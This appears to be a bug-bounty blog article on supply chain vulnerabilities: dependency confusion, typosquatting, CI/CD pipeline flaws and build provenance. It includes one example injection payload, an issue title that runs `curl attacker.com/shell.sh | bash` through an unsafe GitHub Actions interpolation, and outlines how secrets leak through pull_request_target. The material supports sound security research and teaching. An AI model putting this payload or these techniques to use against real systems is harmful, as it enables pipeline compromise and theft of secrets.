---
layout: "@layouts/MarkdownLayout.astro"
title: "Supply Chain Vulnerabilities: The New #3 on OWASP Top 10"
description: "Supply Chain Failures debuted at #3 in OWASP Top 10 2025 with the highest exploit/impact score. Here is how bounty hunters can find dependency confusion, typosquatting, and CI/CD pipeline flaws."
date: "2026-04-07"
---

The [OWASP Top 10 2025](https://owasp.org/Top10/) introduced a new category at position three: Supply Chain Failures. It did not creep in at #9 or #10 like most new entries. It landed at #3, above injection, above SSRF, above everything except broken access control and cryptographic failures. The reason is straightforward. The data showed that supply chain attacks had the highest combined exploit/impact scores of any category in the dataset. When an attacker compromises a dependency, they compromise every application that uses it.

For bounty hunters, this is an enormous opportunity. Most hunters still focus on XSS, IDOR, and SQL injection. Supply chain findings are underexplored, often high severity, and many programs now explicitly accept them. Alex Birsan's [2021 dependency confusion research](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) earned him over $130,000 from Apple, Microsoft, PayPal, and others. That was five years ago. The attack surface has only grown since.

## What OWASP means by supply chain failures

The category covers any vulnerability introduced through third-party components, build systems, or distribution channels. That includes:

- Dependencies pulled from public package registries (npm, PyPI, RubyGems, Maven)
- CI/CD pipelines that build, test, and deploy code
- Container base images and their transitive dependencies
- Build scripts, plugins, and tooling
- Update mechanisms and auto-update channels

The old "Using Components with Known Vulnerabilities" category from OWASP 2017/2021 was narrower. It mostly meant "you are running a library with a CVE." Supply Chain Failures is broader. It recognizes that the problem is not just outdated libraries. It is the entire chain of trust from source code to production artifact.

I think this category was overdue. The SolarWinds attack in 2020, the Codecov bash uploader compromise in 2021, the `ua-parser-js` npm hijack, the `event-stream` backdoor, the xz-utils backdoor in 2024 - these all demonstrated that attacking the supply chain is often easier than attacking the application directly.

## Dependency confusion

Dependency confusion is the highest-value supply chain bug class for bounty hunters. It works because of how package managers resolve names.

### How it works

Most large companies use internal packages for shared code. An internal Python package might be called `company-auth-utils` or `company-logging`. These packages live on a private registry, like a self-hosted Artifactory or AWS CodeArtifact instance.

The vulnerability appears when the build system checks the public registry (pypi.org, npmjs.com) in addition to the private one. If an attacker registers `company-auth-utils` on PyPI with a higher version number than the internal package, many package managers will prefer the public version. The attacker's code runs during installation, typically in a `setup.py` (Python) or `preinstall` script (npm).

Birsan's original research found this pattern at dozens of companies. He identified internal package names by examining JavaScript source maps, public GitHub repositories, and error messages that leaked internal module names. Then he registered those names on public registries with packages that made a DNS callback to confirm execution.

### Where to find internal package names

This is where your [recon skills](/learn/bug-bounty-recon-methodology) pay off. Internal package names leak in several places:

- **JavaScript source maps**: Webpack source maps often contain import paths like `@company/internal-lib`. If the `@company` scope is not claimed on npm, that is a finding.
- **Public GitHub repos**: Companies sometimes reference private packages in `package.json`, `requirements.txt`, or `go.mod` files in their public repositories. The dependency is private, but the name is public.
- **Error messages and stack traces**: Verbose error pages sometimes include module names and paths.
- **Documentation**: Internal docs occasionally reference package names. Check leaked Confluence pages, public wikis, and archived pages via the Wayback Machine.
- **Job postings**: Surprisingly useful. "Experience with our internal-platform-sdk" tells you a package name.

When [reading source code](/learn/reading-source-code-for-vulnerabilities), pay attention to import statements that reference packages you cannot find on public registries. That gap between "referenced" and "publicly available" is exactly where dependency confusion lives.

### Testing safely

You do not need to publish a malicious package to prove dependency confusion. Register the package name on the public registry with a benign payload that only makes an outbound DNS or HTTP request to a server you control. Include a `README` stating it is a security test. Many bounty programs accept the proof-of-concept from name registration alone, without requiring confirmed execution, because the risk is self-evident.

Some programs prefer you just report the unregistered package name without claiming it. Read the program's policy first. If you register the name, be prepared to transfer ownership or unpublish when asked.

### Namespace and scope confusion

npm has scoped packages (`@company/package-name`), and scopes must be claimed. But not every company claims their scope on npm. Check whether `@companyname` exists on npmjs.com. If it does not, and their code references `@companyname/anything`, you have found something worth reporting.

Go modules use repository URLs as package paths, which makes dependency confusion harder but not impossible. Proxy servers like `proxy.golang.org` can introduce edge cases. Python has no native namespace mechanism, making it the most vulnerable ecosystem for this class of bug.

## Typosquatting and package hijacking

Typosquatting is the supply chain equivalent of domain squatting. Register `reqeusts` on PyPI (note the typo) and wait for developers to mistype `pip install requests`. The `crossenv` npm package impersonated `cross-env` and harvested environment variables. `python3-dateutil` mimicked `python-dateutil`.

### Finding typosquat opportunities

I am not suggesting you publish typosquat packages. That is malicious and most programs would not reward it. But you can identify when a company's developers have installed typosquatted packages, or when their documentation directs users to install a package name that could be typosquatted.

Examine `package-lock.json`, `yarn.lock`, `Pipfile.lock`, and `poetry.lock` files in public repos. Look for packages with names suspiciously close to popular libraries. Tools like [pypi-scan](https://github.com/jfrog/pypi-scan) automate this for Python.

### Package hijacking via maintainer compromise

Sometimes the real package gets compromised. The `event-stream` incident happened because a new maintainer was granted publish access after offering to help maintain a dormant package. The `ua-parser-js` hijack happened through a compromised maintainer account.

For bounty programs, look at the dependency tree of the target application. Identify packages maintained by a single person with no 2FA (npm used to expose this in the API). Check if any dependencies have recently changed maintainers. This is harder to weaponize as a proof-of-concept, but a well-documented report showing that a critical dependency is maintained by an account without 2FA, and that a compromise would affect the target, is reportable to mature programs.

## CI/CD pipeline vulnerabilities

CI/CD systems are the factory floor of software. If you compromise the pipeline, you control what gets built and deployed. This is where supply chain bugs and traditional application bugs overlap.

### Exposed secrets in GitHub Actions

GitHub Actions workflows run in the context of a repository. If the repository is public, the workflow files are public too. Read them. I mean it. Go to `.github/workflows/` in every public repo the target owns and read every YAML file.

Common problems I have seen:

- **Secrets in logs**: Workflows that echo environment variables, run `env`, or use `--verbose` flags that dump secrets to build logs. Public repo build logs are readable by anyone.
- **`pull_request_target` misuse**: This event runs workflows in the context of the base repository, with access to its secrets, but it can be triggered by a fork's pull request. If the workflow checks out the PR's code and executes it (runs tests, builds), an attacker can exfiltrate secrets by submitting a PR from a fork. This has been a real vulnerability in projects including several major open-source frameworks.
- **Artifact poisoning**: Workflows that upload build artifacts which are later consumed by deployment pipelines. If you can influence what goes into the artifact (via a PR trigger), you can inject code into the deployment.
- **Self-hosted runners**: If a public repo uses self-hosted runners, any PR can execute code on the runner's host. Persistent runners retain state between jobs, so previous jobs' secrets, tokens, and files may still be accessible.

### GitLab CI, Jenkins, and other systems

The same classes of bugs appear everywhere. Jenkins pipelines stored in `Jenkinsfile` are often in public repos. GitLab CI definitions in `.gitlab-ci.yml` are visible if the project is public. Look for:

- Hardcoded credentials in pipeline definitions
- Overly permissive service account tokens
- Pipelines that install dependencies without integrity verification
- Build steps that curl scripts from external URLs and pipe them to bash

That last one - `curl | bash` in a build pipeline - is disturbingly common. If the external URL is compromisable (expired domain, HTTP without verification, repository with weak access controls), the entire build process is compromisable.

### GitHub Actions injection via untrusted input

Workflow commands can be injected through issue titles, PR titles, branch names, and commit messages if the workflow interpolates these values unsafely:

```yaml
# Vulnerable pattern
- run: echo "Processing ${{ github.event.issue.title }}"
```

If someone creates an issue titled `"; curl attacker.com/shell.sh | bash; echo "`, the shell executes it. The fix is to pass untrusted input through environment variables rather than inline interpolation. But many workflows still use the vulnerable pattern. Searching GitHub for `${{ github.event.` in YAML files belonging to your target can surface these quickly.

## Build provenance and SLSA

[SLSA](https://slsa.dev/) (Supply-chain Levels for Software Artifacts) is a framework for verifying that software artifacts were built from the expected source code by the expected build process. When a target claims SLSA compliance, you can verify it. When they do not comply but should, that is a finding.

Check whether published packages or container images include provenance attestations. If a company distributes software and claims it was built from a specific commit, verify that claim. Gaps between claimed and actual build provenance are reportable in security-focused programs.

Tools like [harden-runner](https://github.com/step-security/harden-runner) detect anomalous behavior in CI/CD workflows, including unexpected network calls, file modifications, and process execution. If a target is not using any form of build hardening on their public repositories, mentioning this in your report adds weight, even though the absence alone is not typically a bounty-eligible finding.

## Which programs accept supply chain findings

Not all do. Many programs scope their bounties to the web application and nothing else. But the trend is moving toward broader scope.

Programs that typically accept supply chain reports:

- Companies with published SBOMs (software bills of materials) - they are already thinking about this
- Programs that list "all company assets" or "*.company.com" in scope
- Organizations with mature security teams (look at their security blog, their use of security.txt)
- Open-source focused companies where the supply chain is the product

Use the [lookup tool](/lookup) to find program scope details. If the scope says "any vulnerability that impacts our users," supply chain findings usually qualify. If the scope only lists specific domains and endpoints, ask before submitting.

When writing your report, frame the impact in terms the triager understands. "I can execute arbitrary code in your build pipeline" is clearer than "I found a dependency confusion vulnerability." Show the chain from attacker action to user impact. The [CVSS scoring guide](/learn/understanding-cvss-scoring-for-bounty-hunters) can help you articulate severity in terms the security team expects.

Read the [legal guide](/learn/bug-bounty-legal-guide-cfaa-and-beyond) before doing any supply chain testing. Registering packages on public registries, submitting pull requests to trigger CI/CD, and probing build systems can cross lines that traditional web testing does not. Make sure the program's safe harbor provisions cover your methodology.

## A practical workflow

Here is how I approach supply chain testing for a target:

1. **Map the dependency surface**: Find public repos, read `package.json`/`requirements.txt`/`go.mod` files, extract internal package names from source maps and error messages.
2. **Check for dependency confusion**: Search public registries for each internal package name. If unregistered, that is a finding. If registered but with suspicious ownership, dig deeper.
3. **Audit CI/CD configurations**: Read every workflow file in every public repo. Search for `pull_request_target`, inline script injection, `curl | bash`, and self-hosted runners.
4. **Review the dependency tree**: Use `npm audit`, `pip-audit`, or `trivy` to identify known vulnerabilities in dependencies. Check for typosquat packages in lock files.
5. **Verify build integrity**: Check for SLSA provenance, signed commits, and protected branches on repositories that produce artifacts users install.
6. **Document and report**: Write up the finding with a clear attack scenario and impact statement. Include reproduction steps that the security team can follow without actually exploiting anything.

## Where supply chain meets traditional bounty hunting

Supply chain findings are not a separate discipline. They overlap with everything else you already do. Your [recon methodology](/learn/bug-bounty-recon-methodology) surfaces the repositories and package names. Your [source code review](/learn/reading-source-code-for-vulnerabilities) skills help you spot dangerous patterns in build configurations. Your understanding of the [OWASP Top 10](/learn/owasp-top-10-2025-for-bug-bounty-hunters) gives you the vocabulary to explain why these findings matter.

The main difference is the blast radius. An XSS on a subdomain affects users of that subdomain. A dependency confusion attack on an internal package could affect every service at the company. Triagers know this, and payouts reflect it.

Supply chain security is still underexplored in the bounty space. Most hunters are not reading CI/CD workflows. Most hunters are not checking whether internal package names are claimable on public registries. If you start looking, you will be one of relatively few people doing so. That alone makes it worth your time.
